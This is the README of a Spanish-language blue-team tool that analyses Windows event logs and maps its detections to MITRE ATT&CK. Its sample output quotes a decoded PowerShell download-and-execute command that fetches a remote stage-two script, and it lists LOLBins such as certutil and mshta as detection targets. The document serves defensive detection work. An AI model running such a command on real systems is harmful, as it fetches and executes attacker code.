# winlog-hunter

Analizador de logs de Windows para blue team. Lee eventos de **Security**, **System** y **Sysmon**, correla patrones de ataque y genera un informe con cada hallazgo mapeado a **MITRE ATT&CK**.

Está pensado para el triage inicial de un analista SOC: le pasas un `.evtx`, un volcado de `wevtutil` o un JSON y en segundos tienes qué pasó, dónde, cuándo y con qué evidencia.

Python puro, sin dependencias obligatorias.

```text
[CRÍTICA] WLH-003 Inicio de sesión correcto tras fuerza bruta
    2026-11-03 09:10:00 UTC · SRV-APP · MITRE T1110, T1078 · 16 evento(s)
    'administrador' inició sesión con éxito desde 203.0.113.50 tras 15 intentos fallidos
      Tipo de logon: 10 (RDP)

[ALTA] WLH-010 PowerShell sospechoso
    2026-11-03 09:40:00 UTC · WS-CONTA01 · MITRE T1059.001 · 1 evento(s)
      Proceso padre: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
      Comando decodificado: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/stage2.ps1')
```

## Detecciones

| ID | Detección | Eventos | MITRE ATT&CK |
|---|---|---|---|
| WLH-001 | Fuerza bruta (N fallos, misma cuenta y origen, en una ventana) | 4625 | T1110.001 |
| WLH-002 | Password spraying (un origen, muchas cuentas) | 4625 | T1110.003 |
| WLH-003 | Inicio de sesión correcto justo después de una fuerza bruta | 4625 → 4624 | T1110, T1078 |
| WLH-004 | Movimiento lateral (misma cuenta en varios equipos, red/RDP) | 4624 tipo 3/10 | T1021 |
| WLH-005 | Registro de eventos borrado | 1102, 104 | T1070.001 |
| WLH-006 | Servicio nuevo; alta si es PsExec o ejecuta algo sospechoso | 7045 | T1543.003, T1569.002 |
| WLH-007 | Tarea programada; alta si lanza PowerShell, scripts o rutas raras | 4698 | T1053.005 |
| WLH-008 | Cuenta de usuario creada | 4720 | T1136 |
| WLH-009 | Alta en grupo privilegiado (detectado por **SID**, vale en cualquier idioma) | 4728, 4732, 4756 | T1098 |
| WLH-010 | PowerShell sospechoso; **decodifica `-EncodedCommand`** | Sysmon 1, 4688 | T1059.001 |
| WLH-011 | LOLBins: certutil, mshta, rundll32, regsvr32, bitsadmin, wmic | Sysmon 1, 4688 | T1218, T1105, T1197, T1047 |
| WLH-012 | Office (Word, Excel, Outlook...) lanzando una shell | Sysmon 1, 4688 | T1566.001, T1204.002 |

Algunos detalles que reducen falsos positivos:

- **Severidad según el contexto.** Un servicio o una tarea programada normales salen como *baja* y uno que ejecuta `powershell -enc` sale como *alta*. Un PowerShell con `-NoProfile` a secas no alerta.
- **Ráfagas agrupadas.** Un ataque de 500 intentos da un único hallazgo, no 100.
- **Contexto en los motivos de fallo.** Los códigos `SubStatus` se traducen ("usuario inexistente", "contraseña incorrecta"...), lo que ayuda a distinguir un spraying de un usuario que olvidó su clave.
- **Cuentas que no interesan.** Se ignoran las cuentas de equipo (`WS01$`), `ANONYMOUS LOGON` y los logons locales al buscar movimiento lateral.

## Instalación

Necesitas Python 3.9 o superior y git.

```bash
git clone https://github.com/BV-cs0/winlog-hunter.git
cd winlog-hunter
python -m pip install .
```

En Linux/macOS, para leer ficheros `.evtx` instala también el extra (las comillas son necesarias en zsh):

```bash
python3 -m pip install ".[evtx]"
```

En Windows no hace falta: los `.evtx` se leen con `wevtutil`, que ya viene con el sistema.

Comprueba que quedó instalado:

```bash
winlog-hunter --version
```

También funciona sin instalar: `python -m winlog_hunter ...` desde `src/`.

## Uso

Los ejemplos con `samples/` se ejecutan desde la carpeta del repositorio (`cd winlog-hunter`). `logs/` y `Security.evtx` representan tus propios ficheros: cámbialos por la ruta donde los tengas.

```bash
# Prueba con el escenario de ataque incluido
winlog-hunter analyze samples/escenario_ataque.jsonl

# Informe HTML (el formato se deduce de la extensión: .html, .md, .json)
winlog-hunter analyze samples/escenario_ataque.jsonl -o informe.html

# Solo lo importante, y código de salida 1 si hay algo crítico (útil en scripts o CI)
winlog-hunter analyze logs/ --min-severity high --fail-on critical

# Ajustar umbrales y elegir reglas
winlog-hunter analyze Security.evtx --threshold 10 --window 2 --rules WLH-001,WLH-003

# Ver todas las reglas
winlog-hunter rules
```

### Cómo sacar los logs de un equipo Windows

```powershell
# Opción 1: EVTX nativo. En Windows se lee con wevtutil (~40.000 eventos en 2-3 s);
# en Linux/macOS se usa python-evtx (pip install .[evtx]), bastante más lento.
# Exportar Security requiere una consola como administrador.
wevtutil epl Security C:\temp\Security.evtx

# Opción 2: XML, sin dependencias extra
wevtutil qe Security /f:xml /c:50000 > security.xml
wevtutil qe System /f:xml /c:50000 > system.xml
wevtutil qe Microsoft-Windows-Sysmon/Operational /f:xml > sysmon.xml

winlog-hunter analyze security.xml system.xml sysmon.xml -o informe.html
```

También acepta JSON por línea (JSONL), arrays JSON y exportaciones con campos planos o anidados en `EventData`, como las de Winlogbeat o las de un SIEM.

### Análisis automático diario del propio equipo (Windows)

[`scripts/analisis-diario.ps1`](scripts/analisis-diario.ps1) exporta los logs reales del equipo (Security, System y Sysmon si está instalado) de las últimas 24 h, los analiza y guarda `informe_<fecha>.html` y `.json` en `Documentos\winlog-hunter`. Los `.evtx` exportados se borran al terminar y los informes de más de 30 días se eliminan solos. Cada ejecución deja una línea de resumen en `ejecuciones.log`.

```powershell
# Ejecutarlo a mano (sin administrador se omite Security)
powershell -ExecutionPolicy Bypass -File .\scripts\analisis-diario.ps1

# Programarlo cada día a las 09:00 (PowerShell abierto como administrador)
powershell -ExecutionPolicy Bypass -File .\scripts\instalar-tarea.ps1
powershell -ExecutionPolicy Bypass -File .\scripts\instalar-tarea.ps1 -Hora 21:30   # otra hora

# Probar la tarea ya, sin esperar
Start-ScheduledTask -TaskName 'winlog-hunter diario'

# Quitarla
powershell -ExecutionPolicy Bypass -File .\scripts\instalar-tarea.ps1 -Desinstalar
```

La tarea se ejecuta como `SYSTEM` para poder leer Security y, si el equipo estaba apagado a esa hora, se lanza al encenderlo. Usa la ruta del script, así que si mueves la carpeta del repositorio vuelve a ejecutar el instalador.

## Seguridad del propio analizador

Los logs pueden contener datos controlados por un atacante (nombres de usuario, líneas de comandos, nombres de tareas), así que la herramienta los trata como entrada hostil:

- **HTML.** Todo el contenido se escapa con `html.escape` y el informe lleva una **Content-Security-Policy** que bloquea cualquier script.
- **Consola.** Se eliminan los caracteres de control, para que una secuencia ANSI dentro de un log no pueda manipular la terminal del analista.
- **XML.** Se rechazan los documentos con `DOCTYPE` (protección frente a XXE y billion laughs) y no se resuelven entidades.
- **Markdown.** Se escapan los caracteres especiales.

Hay tests para cada uno de estos casos.

## Escenario de ejemplo

[`samples/generate_samples.py`](samples/generate_samples.py) genera tres horas de actividad de una pyme ficticia con dos intrusiones encadenadas:

1. Password spraying contra el DC y fuerza bruta por RDP que acaba en un acceso válido a `SRV-APP`.
2. Phishing: un `.docm` lanza PowerShell codificado, `certutil` descarga herramientas, se crea una tarea de persistencia, PsExec y movimiento lateral, una cuenta nueva acaba en *Admins. del dominio* y se borra el registro de seguridad.

El analizador detecta las 12 técnicas sin falsos positivos de severidad media o superior. Todas las IPs públicas son de documentación (RFC 5737).

## Tests

```bash
python -m unittest discover -s tests -v
```

GitHub Actions ejecuta la batería en Linux y Windows con Python 3.10 y 3.12.

## Estructura

```text
src/winlog_hunter/
  parsers.py   lectura de EVTX / XML / JSON y normalización de eventos
  rules.py     reglas de detección (añadir una = una función con @rule)
  report.py    salida en consola, JSON, Markdown y HTML
  cli.py       interfaz de línea de comandos
samples/       generador y escenario de ataque sintético
scripts/       análisis diario automático del propio equipo (PowerShell)
tests/         tests unitarios y de extremo a extremo
```

## Próximos pasos

- Exportar las detecciones como reglas **Sigma**.
- Más fuentes de Sysmon: conexiones de red (3), acceso a LSASS (10) y consultas DNS (22).
- Detección de Kerberoasting (4769 con cifrado RC4) y DCSync (4662).
- Línea temporal combinada por equipo en el informe HTML.

## Aviso

Herramienta educativa y de apoyo al análisis defensivo. Úsala solo con logs de sistemas que tengas autorización para analizar.

Licencia MIT.
